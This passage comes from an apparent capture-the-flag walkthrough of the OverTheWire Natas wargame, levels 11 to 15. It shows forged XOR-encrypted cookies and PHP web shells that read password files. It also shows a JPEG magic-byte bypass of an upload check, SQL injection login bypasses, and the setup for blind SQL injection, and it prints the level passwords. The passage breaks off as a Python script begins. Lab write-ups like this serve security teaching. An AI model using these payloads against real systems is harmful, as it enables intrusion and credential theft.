<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1">// the value of the cookie after base64 decoding</span>
</span><span class='line'><span class="nv">$original</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s1">&#39;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$defaultdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;no&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">// the json encoded version of the default data</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Iterate through each character</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nx">xor_encrypt</span><span class="p">(</span><span class="nv">$original</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ran this through the PHP sandbox at <a href="http://sandbox.onlinephpfunctions.com/">http://sandbox.onlinephpfunctions.com/</a> and the result was the string <code>qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</code>. The string <em>qw8J</em> gets repeated, this is the key! Now we can reuse the code to create a cookie encrypted with this key, and with <em>showpassword</em> set to yes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$defaultdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;yes&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$json_data</span> <span class="o">=</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;qw8J&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Iterate through each character</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$outText</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nx">xor_encrypt</span><span class="p">(</span><span class="nv">$json_data</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running this code gives a new cookie value: <code>ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</code>. Replace the cookie value in the page and you will get the next password: <code>The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</code></p>

<h3>Level 12</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas12.png" title="natas12" alt="natas 12"></p>

<p>For this mission it seems we can upload a file to the server.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">genRandomString</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$length</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$characters</span> <span class="o">=</span> <span class="s2">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$string</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$p</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$p</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nv">$string</span> <span class="o">.=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">makeRandomPath</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">do</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$dir</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nx">genRandomString</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">makeRandomPathFromFilename</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$fn</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$fn</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">makeRandomPath</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;filename&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$target_path</span> <span class="o">=</span> <span class="nx">makeRandomPathFromFilename</span><span class="p">(</span><span class="s2">&quot;upload&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;filename&quot;</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">1000</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;File is too big&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$target_path</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;The file &lt;a href=</span><span class="se">\&quot;</span><span class="si">$target_path</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="si">$target_path</span><span class="s2">&lt;/a&gt; has been uploaded&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;There was an error uploading the file, please try again!&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>The code tests if the file satisfies the constraints and uploads it with a new name that&rsquo;s randomly generated. Then it gives you the link where you can find it:</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/upload.png" title="upload" alt="upload"></p>

<p>So I tried uploading a PHP file that would read the password for the next level:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# cat pass.php 
</span><span class='line'>&lt;?
</span><span class='line'>echo(exec('cat /etc/natas_webpass/natas13'));
</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>


<p>But the extension is changed to a jpg, so the code doesn&rsquo;t get executed. Further in the HTML there is this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;filename&quot;</span> <span class="na">value=</span><span class="s">&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I used Firebug to change the jpg extension to a php one and re-uploaded the file and this time it worked: <code>The file upload/g72k7zidu8.php has been uploaded</code>. Next I followed the link and inside was the password: <code>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</code></p>

<h3>Level 13</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas13.png" title="natas13" alt="natas 13"></p>

<p>Ok, this time they made a modification so that only jpg files can be uploaded..or so they claim. The code is the same as the last challenge, except for a new check:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;File is not an image&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>exif_imagetype()</strong> reads the first bytes of an image and checks its signature. If the signature is invalid, it returns False.</p>

<p>This type of check can be fooled by providing the specific magic number for the file in question. The signature for jpg files is the hex value 0xFFD8FFE0</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# echo -e '\xFF\xD8\xFF\xE0' &gt; pass.php
</span><span class='line'>root@kali:~/Desktop# echo "&lt;?echo(exec('cat /etc/natas_webpass/natas13'));?&gt;" &gt;&gt; pass.php </span></code></pre></td></tr></table></div></figure>


<p>The upload process is the same (don&rsquo;t forget to modify the extension with Firebug or other tools). Then I went to the link and the password is  <code>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</code>. If you notice the weird looking characters ÿØÿà before it, it&rsquo;s because the text representation of the jpg magic number is also echoed back. The password starts after that</p>

<h3>Level 14</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas14.png" title="natas14" alt="natas 14"></p>

<p>Looking at the code hints at what type of vulnerability can be exploited:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas14&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas14&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Executing query: </span><span class="si">$query</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Access denied!&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>No input sanitization = SQL injection! Moreover, we can get additional information by setting debug to True in the URL. For that, I also included the username and password fields in the URL: <a href="http://natas14.natas.labs.overthewire.org/index.php?debug=True&amp;username=test&amp;password=pass">http://natas14.natas.labs.overthewire.org/index.php?debug=True&amp;username=test&amp;password=pass</a></p>

<p>And now there was a message showing the query that was run on the backend:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Executing query: SELECT * from users where username="test" and password="pass"
</span><span class='line'>Access denied!</span></code></pre></td></tr></table></div></figure>


<p>After seeing how the query looks like, I used the following injection string to fool the database:</p>

<p>username = can be anything</p>

<p>password = <code>pass" or 1=1&mdash; </code></p>

<p>To see why this works, look at the query now:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">Executing</span> <span class="n">query</span><span class="p">:</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="ss">&quot;test&quot;</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="ss">&quot;pass&quot;</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- &quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By fixing the quotes we forced the database to evaluate an always true condition (1=1) and bypass the credentials check. The <code>&mdash; </code> comments out the rest of the query which would otherwise break our injection. If you inject in the URL, don&rsquo;t forget that you need to URL encode the space (%20)</p>

<p>After the SQL injection, you will see this: <code>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</code></p>

<h3>Level 15</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas15.png" title="natas15" alt="natas 15"></p>

<p>This time you can check if a username exists or not. Let&rsquo;s look at the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">CREATE TABLE `users` (</span>
</span><span class='line'><span class="cm">  `username` varchar(64) DEFAULT NULL,</span>
</span><span class='line'><span class="cm">  `password` varchar(64) DEFAULT NULL</span>
</span><span class='line'><span class="cm">);</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas15&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas15&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Executing query: </span><span class="si">$query</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;This user exists.&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;This user doesn&#39;t exist.&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Error in query.&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>We can again see the query that is being run on the backend by manipulating the URL: <a href="http://natas15.natas.labs.overthewire.org/index.php?debug=True&amp;username=natas16">http://natas15.natas.labs.overthewire.org/index.php?debug=True&amp;username=natas16</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Executing query: SELECT * from users where username="natas16"
</span><span class='line'>This user exists.</span></code></pre></td></tr></table></div></figure>


<p>So, this time the SQL code checks for the existence of a user and reports whether that username exists or not. We can&rsquo;t inject in a way that would directly give us the password like previously, but we know the query will be run against the <em>users</em> table, which contains both usernames and passwords. There is a way to bruteforce the natas16 password by forcing the database to check it one character at a time and report True of False (user exists or not). The statement to inject will look like this: <code>username=natas16" AND password LIKE BINARY &ldquo;a%&rdquo;&mdash; </code>. Testing it in the URL (don&rsquo;t forget to encode the space after comments), you can check one character a time until the database respons with the user exists message. Then you know the password begins with the respective character and you can move on to the next. But the password is 32 characters long, so we will do it in an automated way!</p>

<p>Some explanation about the SQL keywords:</p>

<ul>
<li><p>The AND operator displays a record if both the first condition AND the second condition are true.</p></li>
<li><p>The LIKE operator is used in a WHERE clause to search for a specified pattern in a column.</p></li>
<li><p>The BINARY operator casts the string following it to a binary string. This is an easy way to force a column comparison to be done byte by byte rather than character by character. This causes the comparison to be case sensitive even if the column is not defined as BINARY or BLOB. BINARY also causes trailing spaces to be significant.</p></li>
<li><p><strong>%</strong>     A substitute for zero or more characters</p></li>
</ul>


<p>If you run this query with the debug parameter set, you will see how it looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Executing query: SELECT * from users where username="natas16"and password like binary "a%"-- "</span></code></pre></td></tr></table></div></figure>


<p>When the entire statement is evaluated, the query will return True of False, and we will use that information to build the password. Here&rsquo;s a Python script to do the job:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'>
